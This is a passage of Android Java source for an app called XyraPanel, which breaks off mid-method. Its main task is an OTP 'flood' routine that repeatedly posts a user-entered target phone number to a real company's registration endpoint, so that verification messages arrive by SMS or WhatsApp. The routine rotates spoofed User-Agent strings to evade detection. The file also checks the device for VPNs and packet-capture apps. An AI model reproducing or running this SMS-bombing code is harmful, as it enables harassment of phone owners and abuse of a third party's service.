package com.xyra.panel;

import android.app.Activity;
import android.app.Dialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.app.Notification;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.content.pm.PackageManager;
import android.content.Context;
import android.view.inputmethod.InputMethodManager;
import android.text.TextWatcher;
import android.text.Editable;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.net.Uri;
import android.view.animation.Animation;
import android.view.animation.TranslateAnimation;
import android.view.WindowManager;
import android.view.GestureDetector;
import android.view.MotionEvent;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.NetworkInterface;
import java.util.Random;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private Button btnStartFlood;
    private Button btnQuick1, btnQuick3, btnQuick5, btnQuickRandom;
    private Button btnSms, btnWhatsapp;
    private ProgressBar progressBar;
    private TextView tvStatusTitle;
    private TextView tvStatSuccess, tvStatFailed, tvStatAvg;
    private View statusDot;
    private View btnFailureInfo;
    
    private View drawerOverlay;
    private LinearLayout navDrawer;
    private ImageButton btnMenu;
    private boolean isDrawerOpen = false;
    private GestureDetector gestureDetector;
    private View rootLayout;

    private AccFloodTask currentTask;
    private boolean isRunning = false;
    private static final int MAX_SEND = 5;
    private String selectedProvider = "sms";
    private static final String PREFS_NAME = "XyraPanelPrefs";
    private static final String KEY_PRIVACY_ACCEPTED = "privacy_accepted";
    private static final String KEY_HISTORY = "send_history";
    private static final String CHANNEL_ID = "xyra_channel";
    private static final String ACTION_SHOW_HISTORY = "com.xyra.panel.SHOW_HISTORY";
    private static final int NOTIFICATION_ID = 1001;
    private Button btnHistory, btnAbout;
    
    private static final String SUPPORT_EMAIL = "xyraofficialsup@gmail.com";
    private static final String REPORT_API_URL = "https://xyra-panel-api.vercel.app/api/report";
    
    private ArrayList<FailureInfo> failureList = new ArrayList<>();
    
    private static class FailureInfo {
        String icon;
        String title;
        String description;
        String time;
        
        FailureInfo(String icon, String title, String description) {
            this.icon = icon;
            this.title = title;
            this.description = description;
            this.time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
        }
    }

    private class AccFloodTask extends AsyncTask<String, Object, String> {

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3;
        private ArrayList<String> userAgentPool;
        private ArrayList<String> usedUserAgents;

        private void initUserAgentPool() {
            userAgentPool = new ArrayList<>();
            usedUserAgents = new ArrayList<>();
            
            String[] browsers = {"Chrome", "Firefox", "Safari", "Edge", "Opera"};
            String[] devices = {
                "Linux; Android 13; SM-S918B",
                "Linux; Android 14; Pixel 8 Pro",
                "Linux; Android 13; SM-A546B",
                "Linux; Android 12; Redmi Note 11",
                "Linux; Android 14; OnePlus 12",
                "Linux; Android 13; vivo V29",
                "Linux; Android 12; OPPO Reno8",
                "Linux; Android 14; Xiaomi 14",
                "Linux; Android 13; realme GT",
                "Linux; Android 11; Samsung Galaxy A52",
                "iPhone; CPU iPhone OS 17_0 like Mac OS X",
                "iPhone; CPU iPhone OS 16_6 like Mac OS X",
                "iPad; CPU OS 17_0 like Mac OS X",
                "Windows NT 10.0; Win64; x64",
                "Macintosh; Intel Mac OS X 10_15_7"
            };
            
            Random rand = new Random();
            for (String device : devices) {
                for (String browser : browsers) {
                    int majorVer = rand.nextInt(30) + 100;
                    int minorVer = rand.nextInt(10);
                    String ua = "Mozilla/5.0 (" + device + ") AppleWebKit/537.36 (KHTML, like Gecko) " 
                              + browser + "/" + majorVer + "." + minorVer + ".0.0 Safari/537.36";
                    userAgentPool.add(ua);
                }
            }
            Collections.shuffle(userAgentPool);
        }

        private String getUniqueUserAgent() {
            if (userAgentPool == null || userAgentPool.isEmpty()) {
                initUserAgentPool();
            }
            
            if (userAgentPool.isEmpty()) {
                userAgentPool.addAll(usedUserAgents);
                usedUserAgents.clear();
                Collections.shuffle(userAgentPool);
            }
            
            String ua = userAgentPool.remove(0);
            usedUserAgents.add(ua);
            return ua;
        }

        @Override
        protected void onPreExecute() {
            isRunning = true;
            statusDot.setBackgroundResource(R.drawable.dot_orange);
            tvStatusTitle.setText("Sending...");
            tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
            tvStatSuccess.setText("0");
            tvStatFailed.setText("0");
            tvStatAvg.setText("0");
            btnStartFlood.setText("STOP");
            btnStartFlood.setBackgroundResource(R.drawable.button_stop);
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            String urlStr = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = targetPhone.startsWith("0") ? targetPhone : "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();

                HttpURLConnection conn = null;
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", selectedProvider);
                    jsonArray.put(payload);

                    String jsonData = jsonArray.toString();
                    String userAgent = getUniqueUserAgent();

                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(20000);
                    conn.setDoOutput(true);

                    conn.setRequestProperty("User-Agent", userAgent);
                    conn.setRequestProperty("Accept", "text/x-component");
                    conn.setRequestProperty("Content-Type", "text/plain");
                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;

                    if (responseCode == 200) {
                        totalSuccesses++;
                        publishProgress("SUCCESS");
                    } else {
                        totalFailures++;
                        publishProgress("FAILURE", "Server Error", "Response code: " + responseCode, i, totalKirim);
                    }

                } catch (java.net.SocketTimeoutException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Timeout", "Koneksi terlalu lama, jaringan lambat", i, totalKirim);
                } catch (java.net.UnknownHostException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Tidak Ada Jaringan", "Periksa koneksi internet Anda", i, totalKirim);
                } catch (java.io.IOException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Koneksi Gagal", e.getMessage(), i, totalKirim);
                } catch (Exception e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Error", e.getMessage(), i, totalKirim);
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }

                int progress = (int) ((float) i / totalKirim * 100);
                long avgTime = (i > 0) ? totalDurationMs / i : 0;
                publishProgress("PROGRESS", progress, totalSuccesses, totalFailures, avgTime, i, totalKirim);

                if (i < totalKirim && !isCancelled()) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return isCancelled() ? "Cancelled" : "Selesai";
        }

        @Override
        protected void onProgressUpdate(Object... values) {
            String type = (String) values[0];
            if ("PROGRESS".equals(type)) {
                progressBar.setProgress((Integer) values[1]);
                tvStatSuccess.setText(String.valueOf((Integer) values[2]));
                tvStatFailed.setText(String.valueOf((Integer) values[3]));
                tvStatAvg.setText(String.valueOf((Long) values[4]));
                tvStatusTitle.setText("Sending " + values[5] + "/" + values[6]);
            } else if ("FAILURE".equals(type)) {
                String title = (String) values[1];
                String desc = (String) values[2];
                addFailureInfo("!", title, desc);
                vibrateFailed();
            } else if ("SUCCESS".equals(type)) {
                vibrateSuccess();
            }
        }

        @Override
        protected void onPostExecute(String result) {
            finishTask(false);
        }

        @Override
        protected void onCancelled() {
            finishTask(true);
        }

        private void finishTask(boolean wasCancelled) {
            isRunning = false;
            progressBar.setVisibility(View.GONE);
            enableQuickButtons(true);
            btnStartFlood.setText("MULAI KIRIM");
            btnStartFlood.setBackgroundResource(R.drawable.button_primary);

            String phone = etTargetPhone.getText().toString().trim();
            saveHistory(phone, totalSuccesses, totalFailures, selectedProvider);

            if (wasCancelled) {
                statusDot.setBackgroundResource(R.drawable.dot_orange);
                tvStatusTitle.setText("Stopped");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
                showNotification("Pengiriman Dihentikan", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            } else {
                statusDot.setBackgroundResource(R.drawable.dot_green);
                tvStatusTitle.setText("Completed");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.successColor));
                showNotification("Pengiriman Selesai", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            }

            currentTask = null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        drawerOverlay = findViewById(R.id.drawer_overlay);
        navDrawer = (LinearLayout) findViewById(R.id.nav_drawer);
        btnMenu = (ImageButton) findViewById(R.id.btn_menu);
        
        if (drawerOverlay != null) {
            drawerOverlay.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                }
            });
        }
        
        btnMenu.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isDrawerOpen) {
                    closeDrawer();
                } else {
                    openDrawer();
                }
            }
        });
        
        setupNavigation();

        etTargetPhone = (EditText) findViewById(R.id.et_target_phone);
        etJumlahKirim = (EditText) findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = (Button) findViewById(R.id.btn_start_flood);
        btnQuick1 = (Button) findViewById(R.id.btn_quick_1);
        btnQuick3 = (Button) findViewById(R.id.btn_quick_3);
        btnQuick5 = (Button) findViewById(R.id.btn_quick_5);
        btnQuickRandom = (Button) findViewById(R.id.btn_quick_random);
        btnSms = (Button) findViewById(R.id.btn_sms);
        btnWhatsapp = (Button) findViewById(R.id.btn_whatsapp);
        progressBar = (ProgressBar) findViewById(R.id.progress_bar);
        tvStatusTitle = (TextView) findViewById(R.id.tv_status_title);
        tvStatSuccess = (TextView) findViewById(R.id.tv_stat_success);
        tvStatFailed = (TextView) findViewById(R.id.tv_stat_failed);
        tvStatAvg = (TextView) findViewById(R.id.tv_stat_avg);
        statusDot = findViewById(R.id.status_dot);
        btnFailureInfo = findViewById(R.id.btn_failure_info);

        btnQuick1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("1");
            }
        });

        btnQuick3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("3");
            }
        });

        btnQuick5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("5");
            }
        });

        btnQuickRandom.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Random rand = new Random();
                int randomNum = rand.nextInt(MAX_SEND) + 1;
                etJumlahKirim.setText(String.valueOf(randomNum));
            }
        });

        btnSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("sms");
            }
        });

        btnWhatsapp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("whatsapp");
            }
        });

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isRunning) {
                    if (currentTask != null) {
                        currentTask.cancel(true);
                    }
                } else {
                    startSending();
                }
            }
        });
        
        btnFailureInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showFailureInfoDialog();
            }
        });

        btnHistory = (Button) findViewById(R.id.btn_history);
        btnAbout = (Button) findViewById(R.id.btn_about);

        btnHistory.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showHistoryDialog();
            }
        });

        btnAbout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showAboutDialog();
            }
        });

        createNotificationChannel();
        checkPrivacyPolicy();
        selectProvider("sms");
        handleNotificationIntent(getIntent());
        
        setupInputValidation();
        updateButtonState();
        setupSwipeGesture();
    }
    
    private void setupSwipeGesture() {
        rootLayout = findViewById(R.id.root_layout);
        
        gestureDetector = new GestureDetector(this, new GestureDetector.SimpleOnGestureListener() {
            private static final int SWIPE_THRESHOLD = 100;
            private static final int SWIPE_VELOCITY_THRESHOLD = 100;
            private static final int EDGE_SIZE = 50;
            
            @Override
            public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) {
                if (e1 == null || e2 == null) return false;
                
                float diffX = e2.getX() - e1.getX();
                float diffY = e2.getY() - e1.getY();
                
                if (Math.abs(diffX) > Math.abs(diffY)) {
                    if (Math.abs(diffX) > SWIPE_THRESHOLD && Math.abs(velocityX) > SWIPE_VELOCITY_THRESHOLD) {
                        if (diffX > 0) {
                            // Swipe right - open drawer only if started from left edge
                            if (e1.getX() < EDGE_SIZE * getResources().getDisplayMetrics().density) {
                                openDrawer();
                                return true;
                            }
                        } else {
                            // Swipe left - close drawer
                            if (isDrawerOpen) {
                                closeDrawer();
                                return true;
                            }
                        }
                    }
                }
                return false;
            }
        });
        
        if (rootLayout != null) {
            rootLayout.setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    return gestureDetector.onTouchEvent(event);
                }
            });
        }
    }
    
    @Override
    public boolean dispatchTouchEvent(MotionEvent event) {
        if (gestureDetector != null && !isRunning) {
            boolean handled = gestureDetector.onTouchEvent(event);
            if (handled && (isDrawerOpen || event.getX() < 50 * getResources().getDisplayMetrics().density)) {
                return true;
            }
        }
        return super.dispatchTouchEvent(event);
    }
    
    private void openDrawer() {
        if (navDrawer != null && !isDrawerOpen) {
            navDrawer.setVisibility(View.VISIBLE);
            if (drawerOverlay != null) {
                drawerOverlay.setVisibility(View.VISIBLE);
            }
            
            Animation slideIn = new TranslateAnimation(
                Animation.RELATIVE_TO_SELF, -1.0f,
                Animation.RELATIVE_TO_SELF, 0.0f,
                Animation.RELATIVE_TO_SELF, 0.0f,
                Animation.RELATIVE_TO_SELF, 0.0f
            );
            slideIn.setDuration(250);
            slideIn.setFillAfter(true);
            navDrawer.startAnimation(slideIn);
            
            isDrawerOpen = true;
        }
    }
    
    private void closeDrawer() {
        if (navDrawer != null && isDrawerOpen) {
            Animation slideOut = new TranslateAnimation(
                Animation.RELATIVE_TO_SELF, 0.0f,
                Animation.RELATIVE_TO_SELF, -1.0f,
                Animation.RELATIVE_TO_SELF, 0.0f,
                Animation.RELATIVE_TO_SELF, 0.0f
            );
            slideOut.setDuration(250);
            slideOut.setAnimationListener(new Animation.AnimationListener() {
                @Override
                public void onAnimationStart(Animation animation) {}
                
                @Override
                public void onAnimationEnd(Animation animation) {
                    navDrawer.setVisibility(View.GONE);
                    if (drawerOverlay != null) {
                        drawerOverlay.setVisibility(View.GONE);
                    }
                }
                
                @Override
                public void onAnimationRepeat(Animation animation) {}
            });
            navDrawer.startAnimation(slideOut);
            
            isDrawerOpen = false;
        }
    }
    
    private void setupNavigation() {
        TextView navHome = (TextView) findViewById(R.id.nav_home);
        TextView navHistory = (TextView) findViewById(R.id.nav_history);
        TextView navAbout = (TextView) findViewById(R.id.nav_about);
        TextView navReport = (TextView) findViewById(R.id.nav_report);
        TextView navPrivacy = (TextView) findViewById(R.id.nav_privacy);
        
        if (navHome != null) {
            navHome.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                }
            });
        }
        
        if (navHistory != null) {
            navHistory.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                    showHistoryDialog();
                }
            });
        }
        
        if (navAbout != null) {
            navAbout.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                    showAboutDialog();
                }
            });
        }
        
        if (navReport != null) {
            navReport.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                    openReportProblem();
                }
            });
        }
        
        if (navPrivacy != null) {
            navPrivacy.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    closeDrawer();
                    showPrivacyDialog();
                }
            });
        }
    }
    
    private void openReportProblem() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_report);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        // Set dialog width to 90% of screen width
        final WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        final EditText etReportMessage = (EditText) dialog.findViewById(R.id.et_report_message);
        Button btnSendReport = (Button) dialog.findViewById(R.id.btn_send_report);
        Button btnCancelReport = (Button) dialog.findViewById(R.id.btn_cancel_report);
        
        btnSendReport.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String message = etReportMessage.getText().toString().trim();
                if (message.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Silakan tulis masalah Anda", Toast.LENGTH_SHORT).show();
                    return;
                }
                
                String deviceInfo = "Device: " + Build.MANUFACTURER + " " + Build.MODEL + 
                                   ", Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
                
                new SendReportTask().execute(message, deviceInfo, "1.0");
                dialog.dismiss();
            }
        });
        
        btnCancelReport.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private class SendReportTask extends AsyncTask<String, Void, Boolean> {
        private String responseMessage = "";
        
        @Override
        protected void onPreExecute() {
            Toast.makeText(MainActivity.this, "Mengirim laporan...", Toast.LENGTH_SHORT).show();
        }
        
        @Override
        protected Boolean doInBackground(String... params) {
            String message = params[0];
            String deviceInfo = params[1];
            String appVersion = params[2];
            
            HttpURLConnection conn = null;
            try {
                JSONObject payload = new JSONObject();
                payload.put("message", message);
                payload.put("deviceInfo", deviceInfo);
                payload.put("subject", "Laporan Masalah XyraPanel");
                payload.put("appVersion", appVersion);
                
                String jsonData = payload.toString();
                
                URL url = new URL(REPORT_API_URL);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(20000);
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Accept", "application/json");
                
                OutputStream os = conn.getOutputStream();
                os.write(jsonData.getBytes("UTF-8"));
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode == 200) {
                    java.io.InputStream is = conn.getInputStream();
                    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    reader.close();
                    
                    JSONObject response = new JSONObject(sb.toString());
                    responseMessage = response.optString("message", "Laporan berhasil dikirim!");
                    return true;
                } else {
                    responseMessage = "Gagal mengirim laporan (Error " + responseCode + ")";
                    return false;
                }
            } catch (Exception e) {
                responseMessage = "Gagal mengirim: " + e.getMessage();
                return false;
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }
        
        @Override
        protected void onPostExecute(Boolean success) {
            if (success) {
                Toast.makeText(MainActivity.this, responseMessage, Toast.LENGTH_LONG).show();
                vibrateSuccess();
            } else {
                Toast.makeText(MainActivity.this, responseMessage, Toast.LENGTH_LONG).show();
                vibrateFailed();
            }
        }
    }
    
    @Override
    public void onBackPressed() {
        if (isDrawerOpen) {
            closeDrawer();
        } else {
            super.onBackPressed();
        }
    }
    
    private void setupInputValidation() {
        TextWatcher inputWatcher = new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            
            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {}
            
            @Override
            public void afterTextChanged(Editable s) {
                updateButtonState();
            }
        };
        
        etTargetPhone.addTextChangedListener(inputWatcher);
        etJumlahKirim.addTextChangedListener(inputWatcher);
    }
    
    private void updateButtonState() {
        if (isRunning) return;
        
        String phone = etTargetPhone.getText().toString().trim();
        String jumlahStr = etJumlahKirim.getText().toString().trim();
        
        boolean isValid = !phone.isEmpty() && !jumlahStr.isEmpty();
        
        if (isValid) {
            try {
                int jumlah = Integer.parseInt(jumlahStr);
                isValid = jumlah > 0 && jumlah <= MAX_SEND;
            } catch (NumberFormatException e) {
                isValid = false;
            }
        }
        
        btnStartFlood.setEnabled(isValid);
        btnStartFlood.setAlpha(isValid ? 1.0f : 0.5f);
    }
    
    private void vibrateSuccess() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(50);
            }
        }
    }
    
    private void vibrateFailed() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                long[] pattern = {0, 100, 50, 100};
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, -1));
            } else {
                long[] pattern = {0, 100, 50, 100};
                vibrator.vibrate(pattern, -1);
            }
        }
    }
    
    private void addFailureInfo(String icon, String title, String description) {
        failureList.add(new FailureInfo(icon, title, description));
        updateFailureIcon();
    }
    
    private void updateFailureIcon() {
        if (failureList.size() > 0) {
            btnFailureInfo.setVisibility(View.VISIBLE);
        } else {
            btnFailureInfo.setVisibility(View.GONE);
        }
    }
    
    private void showFailureInfoDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_failure_info);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        // Set dialog width to 90% of screen width
        final WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        TextView tvFailureCount = (TextView) dialog.findViewById(R.id.tv_failure_count);
        LinearLayout layoutItems = (LinearLayout) dialog.findViewById(R.id.layout_failure_items);
        Button btnClear = (Button) dialog.findViewById(R.id.btn_clear_failures);
        Button btnClose = (Button) dialog.findViewById(R.id.btn_close_failures);
        
        String currentTime = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
        
        boolean vpnActive = isVpnActive();
        boolean captureInstalled = isPacketCaptureAppInstalled();
        boolean noNetwork = !isNetworkAvailable();
        
        int totalIssues = 0;
        if (vpnActive) totalIssues++;
        if (captureInstalled) totalIssues++;
        if (noNetwork) totalIssues++;
        
        for (FailureInfo info : failureList) {
            if (info.title.equals("Tidak Ada Jaringan") && noNetwork) {
                continue;
            }
            totalIssues++;
        }
        
        tvFailureCount.setText(totalIssues + " masalah terdeteksi");
        
        if (vpnActive) {
            addFailureItemToLayout(layoutItems, "V", "VPN Terdeteksi", "VPN aktif dapat mengganggu koneksi", currentTime);
        }
        
        if (captureInstalled) {
            addFailureItemToLayout(layoutItems, "H", "HTTP Capture Terdeteksi", "Aplikasi capture HTTP/SSL terinstal", currentTime);
        }
        
        if (noNetwork) {
            addFailureItemToLayout(layoutItems, "N", "Tidak Ada Jaringan", "Perangkat tidak terhubung ke internet", currentTime);
        }
        
        for (FailureInfo info : failureList) {
            if (info.title.equals("Tidak Ada Jaringan") && noNetwork) {
                continue;
            }
            addFailureItemToLayout(layoutItems, info.icon, info.title, info.description, info.time);
        }
        
        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                failureList.clear();
                updateFailureIcon();
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "Info kegagalan dihapus", Toast.LENGTH_SHORT).show();
            }
        });
        
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private void addFailureItemToLayout(LinearLayout parent, String icon, String title, String desc, String time) {
        View itemView = LayoutInflater.from(this).inflate(R.layout.item_failure_reason, parent, false);
        
        TextView tvIcon = (TextView) itemView.findViewById(R.id.tv_failure_icon);
        TextView tvTitle = (TextView) itemView.findViewById(R.id.tv_failure_title);
        TextView tvDesc = (TextView) itemView.findViewById(R.id.tv_failure_desc);
        TextView tvTime = (TextView) itemView.findViewById(R.id.tv_failure_time);
        
        tvIcon.setText(icon);
        tvTitle.setText(title);
        tvDesc.setText(desc);
        tvTime.setText(time);
        
        parent.addView(itemView);
    }
    
    private boolean isVpnActive() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network activeNetwork = cm.getActiveNetwork();
                if (activeNetwork != null) {
                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
                    if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                        return true;
                    }
                }
            } else {
                try {
                    Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
                    while (networkInterfaces.hasMoreElements()) {
                        NetworkInterface ni = networkInterfaces.nextElement();
                        if (ni.isUp() && (ni.getName().contains("tun") || ni.getName().contains("ppp"))) {
                            return true;
                        }
                    }
                } catch (Exception e) {
                    return false;
                }
            }
        }
        return false;
    }
    
    private boolean isPacketCaptureAppInstalled() {
        String[] captureApps = {
            "app.greyshirts.sslcapture",
            "com.guoshi.httpcanary",
            "com.minhui.networkcapture",
            "io.github.nicemoe.fiddler",
            "com.egorovandreyrm.pcapremote"
        };
        
        PackageManager pm = getPackageManager();
        for (String pkg : captureApps) {
            try {
                pm.getPackageInfo(pkg, 0);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
            }
        }
        return false;
    }
    
    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network activeNetwork = cm.getActiveNetwork();
                if (activeNetwork != null) {
                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
                    return caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
                }
            } else {
                NetworkInfo activeNetworkInfo = cm.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }
    
    private void selectProvider(String provider) {
        selectedProvider = provider;
        if ("sms".equals(provider)) {
            btnSms.setBackgroundResource(R.drawable.button_quick_accent);
            btnSms.setTextColor(Color.WHITE);
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick);
            btnWhatsapp.setTextColor(getResources().getColor(R.color.colorPrimary));
        } else {
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick_accent);
            btnWhatsapp.setTextColor(Color.WHITE);
            btnSms.setBackgroundResource(R.drawable.button_quick);
            btnSms.setTextColor(getResources().getColor(R.color.colorPrimary));
        }
    }
    
    private void enableQuickButtons(boolean enabled) {
        btnQuick1.setEnabled(enabled);
        btnQuick3.setEnabled(enabled);
        btnQuick5.setEnabled(enabled);
        btnQuickRandom.setEnabled(enabled);
        btnSms.setEnabled(enabled);
        btnWhatsapp.setEnabled(enabled);
    }
    
    private void startSending() {
        String phone = etTargetPhone.getText().toString().trim();
        String jumlahStr = etJumlahKirim.getText().toString().trim();
        
        if (phone.isEmpty()) {
            Toast.makeText(this, "Masukkan nomor telepon", Toast.LENGTH_SHORT).show();
            return;
        }
        
        if (jumlahStr.isEmpty()) {
            Toast.makeText(this, "Masukkan jumlah pengiriman", Toast.LENGTH_SHORT).show();
            return;
        }
        
        int jumlah;
        try {
